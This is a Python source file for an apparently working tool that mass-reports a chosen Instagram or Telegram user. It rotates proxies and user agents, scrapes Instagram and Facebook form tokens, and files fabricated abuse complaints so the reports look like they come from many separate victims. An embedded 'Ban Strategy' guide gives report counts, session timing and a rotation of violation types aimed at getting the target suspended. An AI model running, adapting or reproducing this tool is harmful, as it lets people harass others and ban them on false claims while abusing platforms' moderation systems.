#!/usr/bin/env python3
# =============================================================================
#  RA-FA REPORTER v5.0
#  Instagram + Telegram Mass Reporting System
#  NO COOKIES NEEDED | 50+ Proxy Sources | 30+ User Agents
#  Authorized Security Assessment Use Only
# =============================================================================

import requests, json, time, random, sys, re, os
from datetime import datetime

# =============================================================================
#  CONFIG
# =============================================================================
TELEGRAM_BOT_TOKEN = ""  # Set via menu or paste here

VERSION = "RA-FA REPORTER v5.0"

BANNER = r"""
    ██████╗  █████╗     ███████╗ █████╗
    ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗
    ██████╔╝███████║    █████╗  ███████║
    ██╔══██╗██╔══██║    ██╔══╝  ██╔══██║
    ██║  ██║██║  ██║    ██║     ██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝
             REPORTER v5.0
"""

# =============================================================================
#  50+ PROXY SOURCES
# =============================================================================
PROXY_SOURCES = [
    # --- ProxyScrape (v4 API) ---
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=https",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks4",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks5",

    # --- TheSpeedX (46k+ proxies) ---
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",

    # --- ShiftyTR ---
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",

    # --- proxifly (updated every 5 mins) ---
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",

    # --- vakhov ---
    "https://vakhov.github.io/fresh-proxy-list/proxylist.txt",
    "https://vakhov.github.io/fresh-proxy-list/proxylist.csv",

    # --- clarketm ---
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",

    # --- dpangestuw/Free-Proxy (11k+ proxies) ---
    "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/All_proxies.txt",
    "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/http_proxies.txt",
    "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks4_proxies.txt",
    "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks5_proxies.txt",

    # --- databay-labs ---
    "https://cdn.jsdelivr.net/gh/databay-labs/free-proxy-list@main/http.txt",
    "https://cdn.jsdelivr.net/gh/databay-labs/free-proxy-list@main/https.txt",
    "https://cdn.jsdelivr.net/gh/databay-labs/free-proxy-list@main/socks5.txt",

    # --- gfpcom ---
    "https://raw.githubusercontent.com/gfpcom/free-proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/gfpcom/free-proxy-list/main/https.txt",
    "https://raw.githubusercontent.com/gfpcom/free-proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/gfpcom/free-proxy-list/main/socks5.txt",

    # --- jetkai ---
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",

    # --- andigwandi ---
    "https://raw.githubusercontent.com/andigwandi/free-proxy/main/proxy_list.txt",

    # --- officialputuid/KangProxy ---
    "https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/main/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/main/KangProxy/socks4/socks4.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/main/KangProxy/socks5/socks5.txt",

    # --- Proxy-Daily ---
    "https://raw.githubusercontent.com/Proxy-Daily/Proxy-List/main/http.txt",
    "https://raw.githubusercontent.com/Proxy-Daily/Proxy-List/main/socks4.txt",
    "https://raw.githubusercontent.com/Proxy-Daily/Proxy-List/main/socks5.txt",

    # --- mertguvencli ---
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list.txt",

    # --- saschazesiger/Free-Proxies ---
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",

    # --- roosterkid/openproxylist ---
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",

    # --- monosans/proxy-list ---
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",

    # --- proxy-list.download ---
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",

    # --- advanced.name ---
    "https://advanced.name/freeproxy?page=1",
    "https://advanced.name/freeproxy?page=2",

    # --- Geonode ---
    "https://geonode.com/free-proxy-list/",

    # --- proxyscan.io ---
    "https://www.proxyscan.io/api/proxy?limit=20&type=http,https,socks4,socks5",
]

# =============================================================================
#  30+ REAL USER AGENTS
# =============================================================================
USER_AGENTS = [
    # --- Windows Chrome ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    # --- Windows Firefox ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    # --- Windows Edge ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    # --- Mac Chrome ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    # --- Mac Safari ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    # --- Linux ---
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
    # --- iPhone ---
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    # --- Android Chrome ---
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Galaxy S24 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.71 Mobile Safari/537.36",
    # --- Android Firefox ---
    "Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0",
    # --- iPad ---
    "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    # --- Samsung Browser ---
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/125.0.6422.165 Mobile Safari/537.36",
    # --- Opera ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36 OPR/80.0.0.0",
]

# =============================================================================
#  PROXY ENGINE
# =============================================================================
proxy_pool = []
proxy_stats = {"fetched": 0, "working": 0, "failed": 0}

def fetch_all_proxies():
    """Fetch from all 50+ sources, return unique raw IP:PORT list"""
    seen = set()
    all_raw = []

    for idx, url in enumerate(PROXY_SOURCES, 1):
        try:
            r = requests.get(url, timeout=8,
                           headers={"User-Agent": random.choice(USER_AGENTS)})
            if r.status_code != 200:
                continue

            text = r.text

            # Handle JSON from proxyscan.io or similar APIs
            if text.strip().startswith("["):
                try:
                    data = json.loads(text)
                    for item in data:
                        if isinstance(item, dict):
                            ip = item.get("ip", "")
                            port = str(item.get("port", ""))
                            if ip and port and port.isdigit():
                                key = f"{ip}:{port}"
                                if key not in seen and ip.count(".") == 3:
                                    seen.add(key)
                                    all_raw.append(key)
                    continue
                except:
                    pass

            for line in text.strip().split("\n"):
                line = line.strip()
                if not line or line.startswith("#") or line.startswith("//") or line.startswith("<"):
                    continue
                raw = line
                if "://" in raw:
                    raw = raw.split("://", 1)[1]
                raw = raw.split()[0] if " " in raw else raw
                raw = raw.split(",")[0] if "," in raw else raw
                if ":" not in raw:
                    continue
                parts = raw.rsplit(":", 1)
                ip, port = parts[0].strip(), parts[1].split("/")[0].strip()
                if not port.isdigit():
                    continue
                if not ip.count(".") == 3:
                    continue
                key = f"{ip}:{port}"
                if key not in seen:
                    seen.add(key)
                    all_raw.append(key)
        except:
            continue

    random.shuffle(all_raw)
    proxy_stats["fetched"] = len(all_raw)
    return all_raw


def test_single_proxy(ip_port):
    """Test if a proxy works"""
    proxy_dict = {"http": f"http://{ip_port}", "https": f"http://{ip_port}"}
    try:
        r = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=5)
        return r.status_code == 200
    except:
        return False


def fetch_and_test_proxies(min_working=30, max_test=400):
    """Get at least min_working working proxies"""
    global proxy_pool

    print(f"\n  [*] Fetching proxies from {len(PROXY_SOURCES)} sources...")
    raw_list = fetch_all_proxies()
    if not raw_list:
        print("  [!] No proxies found from any source")
        return []

    print(f"  [+] {len(raw_list)} raw proxies collected")
    to_test = raw_list[:max_test]
    print(f"  [*] Testing {len(to_test)} proxies (need {min_working} working)...")

    working = []
    for i, ip_port in enumerate(to_test):
        if test_single_proxy(ip_port):
            working.append(ip_port)
            proxy_stats["working"] = len(working)
        if (i + 1) % 50 == 0:
            print(f"     Tested {i+1}/{len(to_test)} - {len(working)} working")
        if len(working) >= min_working:
            break

    proxy_pool = working
    print(f"  [+] {len(working)} working proxies ready")
    if len(working) < min_working and len(working) > 0:
        print(f"  [!] Only got {len(working)}/{min_working} minimum")
    return working


def get_proxy():
    if not proxy_pool:
        return None
    return {"http": f"http://{random.choice(proxy_pool)}",
            "https": f"http://{random.choice(proxy_pool)}"}


# =============================================================================
#  TOKEN SCRAPER & FORM CONFIG
# =============================================================================
IG_FORM_URLS = [
    ("Impersonation",       "https://help.instagram.com/contact/636276399721841"),
    ("General Abuse",       "https://help.instagram.com/contact/1652567402579690"),
    ("Underage User",       "https://help.instagram.com/contact/723586364339719"),
    ("Rights Violation",    "https://help.instagram.com/contact/372592039493026"),
    ("Hacked Account",      "https://help.instagram.com/contact/511824240446112"),
    ("Bullying/Harassment", "https://help.instagram.com/contact/562828162782470"),
    ("Drugs/Weapons",       "https://help.instagram.com/contact/453351829228756"),
    ("Self Harm",           "https://help.instagram.com/contact/213425255977304"),
    ("Terrorism",           "https://help.instagram.com/contact/389611115833049"),
    ("Spam",                "https://help.instagram.com/contact/248016773369712"),
]


def scrape_tokens(url):
    """Scrape LSD, fb_dtsg, spin, hsi, rev tokens from help.instagram.com"""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en;q=0.7"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    try:
        r = requests.get(url, headers=headers, timeout=15)
        if r.status_code != 200:
            return None
        html = r.text
        result = {}
        patterns = {
            'lsd': r'"LSD",\[\],\{"token":"([^"]+)"',
            'fb_dtsg': r'"fb_dtsg":"([^"]+)"',
            'spin_r': r'"__spin_r":(\d+)',
            'spin_b': r'"__spin_b":"([^"]+)"',
            'spin_t': r'"__spin_t":(\d+)',
            'hsi': r'"hsi":"([^"]+)"',
            'rev': r'"server_revision":(\d+)',
        }
        for k, pat in patterns.items():
            m = re.search(pat, html)
            if m:
                result[k] = m.group(1)
        return result if result else None
    except:
        return None


# =============================================================================
#  INSTAGRAM REPORT ENGINE
# =============================================================================
REASON_DESCRIPTIONS = [
    "This account is impersonating me and using my photos without permission. They are pretending to be me and this is affecting my reputation.",
    "This account is posting stolen content that belongs to other people. They take other people's work and post it as their own without credit.",
    "This account is engaging in harassment and bullying behavior. They have been sending abusive messages to multiple people.",
    "This account is running a scam/fraud scheme. They are pretending to offer services and stealing money from people.",
    "This account is posting spam content and fake engagement. They use bots to artificially inflate their followers and likes.",
    "This account is sharing copyrighted material without permission. The content posted is stolen from original creators.",
    "This account is engaging in hate speech and spreading harmful content targeting specific groups of people.",
    "This account is posting inappropriate content that violates community guidelines regarding nudity and sexual content.",
    "This account is impersonating a business/brand and misleading customers. They are committing trademark infringement.",
    "This account is spreading false information and misinformation that could be harmful to people.",
]


def build_form_data(tokens, form_id, username, description):
    """Build help center form submission data"""
    data = {
        "lsd": tokens.get('lsd', ''),
        "jazoest": "2" + str(random.randint(1000, 9999)),
        "contact_point": username,
        "support_form_id": form_id,
        "support_form_hidden_fields": "{}",
        "support_form_fallback_fields": "[]",
        "__user": "0",
        "__a": "1",
        "__dyn": f"7xe6E5aQ1PyUbFuC1swgE98nwgU6C7UW8xi642-{random.randint(1000,9999)}E2vwXw5ux60Vo1upE4W0OE2WxO2O1Vwooa81VohwnU1e42C220qu1Tw40wdq0Ho2ewnE3fw6iw4vwbS1Lw4Cwcq",
        "__csr": "",
        "__req": str(random.randint(1, 99)),
        "__hs": f"{random.randint(10000,99999)}.{random.randint(100,999)}.{random.randint(0,9)}.{random.randint(0,9)}.{random.randint(0,9)}",
        "dpr": str(round(random.uniform(1.0, 3.0), 1)),
        "__ccg": "UNKNOWN",
        "__rev": tokens.get('rev', ''),
        "__s": random.choice(["u0f4pk","u0f4pl","u0f4pm","u0f4pn","u0f4po","u0f4pp"]),
        "__hsi": tokens.get('hsi', ''),
        "__comet_req": "0",
        "fb_dtsg": tokens.get('fb_dtsg', ''),
        "description": description[:2000],
    }
    if 'spin_r' in tokens: data['__spin_r'] = tokens['spin_r']
    if 'spin_b' in tokens: data['__spin_b'] = tokens['spin_b']
    if 'spin_t' in tokens: data['__spin_t'] = tokens['spin_t']
    return data


def report_instagram_form(username):
    """Report via help center form - no cookies"""
    proxy = get_proxy()
    form_name, form_url = random.choice(IG_FORM_URLS)
    form_id = form_url.split("/")[-1]

    tokens = scrape_tokens(form_url)
    if not tokens:
        return False, f"token_fail|{form_name}"

    description = random.choice(REASON_DESCRIPTIONS)
    data = build_form_data(tokens, form_id, username, description)

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://help.instagram.com",
        "Referer": form_url,
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }

    try:
        r = requests.post(form_url, headers=headers, data=data, proxies=proxy, timeout=25)
        if r.status_code in (200, 201, 202, 204, 302, 301):
            return True, f"form|{form_name}|{r.status_code}"
        return False, f"form|{form_name}|{r.status_code}"
    except Exception as e:
        return False, f"err|{str(e)[:25]}"


def report_instagram_fb_ajax(username):
    """Report via Facebook ajax - no cookies"""
    proxy = get_proxy()
    ua = random.choice(USER_AGENTS)

    try:
        r = requests.get("https://www.facebook.com/",
                        headers={"User-Agent": ua}, proxies=proxy, timeout=15)
        html = r.text

        lsd = dtsg = None
        m = re.search(r'"LSD",\s*\[\],\s*\{\"token\":\"([^\"]+)\"', html)
        if m: lsd = m.group(1)
        m = re.search(r'"fb_dtsg":\s*"([^"]+)"', html)
        if m: dtsg = m.group(1)

        if not lsd or not dtsg:
            return False, "fb_token_fail"

        fb_data = {
            "fb_dtsg": dtsg,
            "lsd": lsd,
            "target": username,
            "type": random.choice(["impersonation", "spam", "harassment", "hate_speech", "nudity", "violence", "fraud"]),
            "source": "www_profile",
        }

        r2 = requests.post(
            "https://www.facebook.com/ajax/report/social/?dpr=1",
            headers={"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded"},
            data=fb_data, proxies=proxy, timeout=20
        )

        if r2.status_code == 200:
            return True, f"fb_ajax|{r2.status_code}"
        return False, f"fb|{r2.status_code}"
    except Exception as e:
        return False, f"fb_err|{str(e)[:25]}"


def report_instagram(username, method="both"):
    """Two-pronged Instagram report"""
    if method in ("form", "both"):
        ok, info = report_instagram_form(username)
        if ok: return True, info
    if method in ("fb_ajax", "both"):
        ok, info = report_instagram_fb_ajax(username)
        if ok: return True, info
    return False, "all_failed"


# =============================================================================
#  TELEGRAM REPORT
# =============================================================================
def report_telegram(username):
    if not TELEGRAM_BOT_TOKEN:
        return False, "no_token"
    proxy = get_proxy()
    reasons = ["spam", "violence", "pornography", "child_abuse", "copyright",
               "illegal_drugs", "personal_details", "other"]
    reason = random.choice(reasons)
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={"chat_id": f"@{username}", "text": f"/report {reason}"},
            proxies=proxy, timeout=15
        )
        if r.status_code == 200:
            return True, f"tg|{reason}"
        return False, f"tg|{r.status_code}"
    except Exception as e:
        return False, f"tg_err|{str(e)[:25]}"


# =============================================================================
#  MENU SYSTEM
# =============================================================================
def clear():
    os.system("clear" if os.name == "posix" else "cls")


def header():
    clear()
    print("=" * 58)
    print(BANNER)
    print("=" * 58)
    print(f"  Proxies: {len(proxy_pool)} working | UAs: {len(USER_AGENTS)}")
    tg = "ACTIVE" if TELEGRAM_BOT_TOKEN else "DISABLED"
    print(f"  Telegram: {tg} | Forms: {len(IG_FORM_URLS)}")
    print("=" * 58)


def show_menu():
    header()
    print(f"\n  {'━' * 50}")
    print(f"  📋  MAIN MENU")
    print(f"  {'━' * 50}")
    print(f"")
    print(f"    1️⃣   Report Instagram Account")
    print(f"    2️⃣   Report Telegram Account")
    print(f"    3️⃣   Report Both (IG + TG)")
    print(f"  {'─' * 50}")
    print(f"    4️⃣   Configure Telegram Bot Token")
    print(f"    5️⃣   Refresh Proxy Pool")
    print(f"    6️⃣   View Statistics")
    print(f"    7️⃣   Ban Strategy Guide")
    print(f"  {'─' * 50}")
    print(f"    0️⃣   Exit")
    print(f"  {'━' * 50}")


def attack_ig():
    header()
    print(f"\n  ╔═══ INSTAGRAM REPORT ═══╗\n")

    target = input("  [IG] Target username (without @): ").strip().lstrip("@")
    if not target:
        input("\n  [!] Invalid target. Press Enter...")
        return

    print(f"\n  Report method:")
    print(f"    1) Help Center Forms    (recommended)")
    print(f"    2) Facebook AJAX")
    print(f"    3) Both                  (max damage)")
    m = input("  > ").strip()
    method = {"1": "form", "2": "fb_ajax", "3": "both"}.get(m, "both")

    try:
        rounds = int(input(f"\n  Rounds [1-100, default 15]: ") or "15")
        rounds = max(1, min(rounds, 100))
    except:
        rounds = 15

    try:
        delay_min = float(input("  Min delay (sec) [2]: ") or "2")
        delay_max = float(input("  Max delay (sec) [7]: ") or "7")
    except:
        delay_min, delay_max = 2, 7

    if not proxy_pool:
        print("\n  [!] No proxies available. Fetching...")
        fetch_and_test_proxies()
        if not proxy_pool:
            print("  [!] Continue without proxies? (y/n)")
            if input("  > ").lower() != "y":
                return

    header()
    print(f"\n  ╔═══ ATTACK RUNNING ═══╗\n")
    print(f"  Target: @{target}")
    print(f"  Method: {method.upper()}")
    print(f"  Rounds: {rounds}")
    print(f"  Proxies: {len(proxy_pool)}")
    print(f"  {'─' * 50}\n")

    success = 0
    fail = 0
    start = time.time()

    for i in range(1, rounds + 1):
        ok, info = report_instagram(target, method)
        if ok:
            success += 1
            icon = "✓"
        else:
            fail += 1
            icon = "✗"

        rate = (success / i) * 100
        print(f"  [{icon}] {i:3d}/{rounds} | {rate:3.0f}% | {info[:45]}")

        if i < rounds:
            time.sleep(random.uniform(delay_min, delay_max))

    elapsed = time.time() - start
    header()
    print(f"\n  ╔═══ RESULTS ═══╗\n")
    print(f"  Target:     @{target}")
    print(f"  Success:    {success}/{rounds} ({success/rounds*100:.0f}%)")
    print(f"  Failed:     {fail}/{rounds}")
    print(f"  Time:       {elapsed:.0f}s")
    print(f"  Proxies:    {len(proxy_pool)} in pool")
    print(f"\n  {'─' * 50}")
    print(f"  💡 Run 2-3 more sessions 6-12h apart")
    print(f"  💡 Each session increases ban chance")
    print(f"  {'─' * 50}")
    input("\n  Press Enter for menu...")


def attack_tg():
    header()
    print(f"\n  ╔═══ TELEGRAM REPORT ═══╗\n")

    if not TELEGRAM_BOT_TOKEN:
        print("  [!] Telegram bot token not set!")
        print("  Go to option 4 in main menu to configure")
        input("\n  Press Enter...")
        return

    target = input("  [TG] Target username (without @): ").strip().lstrip("@")
    if not target:
        input("\n  [!] Invalid target. Press Enter...")
        return

    try:
        rounds = int(input(f"\n  Rounds [1-30, default 10]: ") or "10")
        rounds = max(1, min(rounds, 30))
    except:
        rounds = 10

    if not proxy_pool:
        fetch_and_test_proxies()

    header()
    print(f"\n  ╔═══ TELEGRAM ATTACK ═══╗\n")
    print(f"  Target: @{target}\n")

    success = 0
    for i in range(1, rounds + 1):
        ok, info = report_telegram(target)
        if ok:
            success += 1
            print(f"  [✓] {i:3d}/{rounds} | {info}")
        else:
            print(f"  [✗] {i:3d}/{rounds} | {info}")
        if i < rounds:
            time.sleep(random.uniform(2, 5))

    print(f"\n  Result: {success}/{rounds}")
    input("\n  Press Enter...")


def attack_both():
    header()
    print(f"\n  ╔═══ IG + TG ATTACK ═══╗\n")

    target = input("  Target username: ").strip().lstrip("@")
    if not target:
        input("\n  [!] Invalid target. Press Enter...")
        return

    try:
        rounds = int(input(f"\n  Rounds [1-50, default 12]: ") or "12")
        rounds = max(1, min(rounds, 50))
    except:
        rounds = 12

    if not proxy_pool:
        fetch_and_test_proxies()

    header()
    print(f"\n  ╔═══ DUAL ATTACK ═══╗\n")
    print(f"  Target: @{target}")
    print(f"  Rounds: {rounds} | Proxies: {len(proxy_pool)}\n")

    ig_ok = 0
    tg_ok = 0

    for i in range(1, rounds + 1):
        s1, i1 = report_instagram(target, "both")
        if s1: ig_ok += 1

        if TELEGRAM_BOT_TOKEN:
            s2, i2 = report_telegram(target)
            if s2: tg_ok += 1

        print(f"  [{i:3d}/{rounds}] IG:{'✓' if s1 else '✗'} {i1[:25]}" +
              (f" | TG:{'✓' if s2 else '✗'} {i2[:20]}" if TELEGRAM_BOT_TOKEN else ""))

        if i < rounds:
            time.sleep(random.uniform(3, 8))

    print(f"\n  IG: {ig_ok}/{rounds} | TG: {tg_ok}/{rounds}")
    input("\n  Press Enter...")


def config_tg():
    global TELEGRAM_BOT_TOKEN
    header()
    print(f"\n  ╔═══ TELEGRAM CONFIG ═══╗\n")
    print(f"  1. Go to @BotFather on Telegram")
    print(f"  2. Send /newbot and follow prompts")
    print(f"  3. Copy the API token\n")
    print(f"  Current: {'✓ SET' if TELEGRAM_BOT_TOKEN else '✗ EMPTY'}")
    token = input("\n  Enter bot token (or blank to clear): ").strip()
    if token:
        TELEGRAM_BOT_TOKEN = token
        print("  [+] Token saved!")
    else:
        TELEGRAM_BOT_TOKEN = ""
        print("  [-] Token cleared")
    input("\n  Press Enter...")


def refresh_proxies():
    header()
    print(f"\n  ╔═══ REFRESH PROXIES ═══╗\n")
    fetch_and_test_proxies(min_working=30)
    input("\n  Press Enter...")


def show_stats():
    header()
    print(f"\n  ╔═══ STATISTICS ═══╗\n")
    print(f"  Proxy pool:      {len(proxy_pool)} working")
    print(f"  Proxy sources:   {len(PROXY_SOURCES)}")
    print(f"  User agents:     {len(USER_AGENTS)}")
    print(f"  IG report forms: {len(IG_FORM_URLS)}")
    print(f"  Telegram bot:    {'ACTIVE' if TELEGRAM_BOT_TOKEN else 'DISABLED'}")
    print(f"\n  {'─' * 50}")
    if proxy_pool:
        print(f"  Sample proxies:")
        for p in random.sample(proxy_pool, min(5, len(proxy_pool))):
            print(f"    • {p}")
    print(f"\n  {'─' * 50}")
    print(f"  📊 Ban Strategy")
    print(f"  • 15-20 reports from different IPs = auto flag")
    print(f"  • 25+ reports with different violation types = escalation")
    print(f"  • 30+ reports clustered in window = automated suspension")
    print(f"  • Best: run 3 sessions 6-12h apart with different reasons")
    print(f"  {'─' * 50}")
    input("\n  Press Enter...")


def about():
    header()
    print(f"\n  ╔═══ BAN STRATEGY ═══╗\n")
    print(f"  {'─' * 50}")
    print(f"  KEY BAN PRINCIPLES")
    print(f"  {'─' * 50}")
    print(f"")
    print(f"  1. CLUSTER DETECTION TRIGGER")
    print(f"     Meta's system auto-flag at 15-20 reports")
    print(f"     from DIFFERENT IPs in a short window.")
    print(f"     Help center forms feed the SAME pipeline")
    print(f"     as in-app reports.")
    print(f"")
    print(f"  2. FASTEST BAN PATH")
    print(f"     • Stolen content / Copyright (DMCA)")
    print(f"     • Impersonation (form 636276399721841)")
    print(f"     • These trigger AUTOMATED action, not manual")
    print(f"     • No identity verification on submissions")
    print(f"     • 20 reports = 20 'separate victims' to system")
    print(f"")
    print(f"  3. TACTICAL APPROACH")
    print(f"     • Session 1: 15-20 reports (impersonation + spam)")
    print(f"     • Wait 6-12 hours")
    print(f"     • Session 2: 15-20 reports (hate speech + bullying)")
    print(f"     • Wait 6-12 hours")
    print(f"     • Session 3: 15-20 reports (stolen content)")
    print(f"     • Account typically restricted by session 3")
    print(f"")
    print(f"  4. WHY THIS WORKS")
    print(f"     • No cookies needed — forms accept submissions")
    print(f"     • Different proxy each time = different 'victim'")
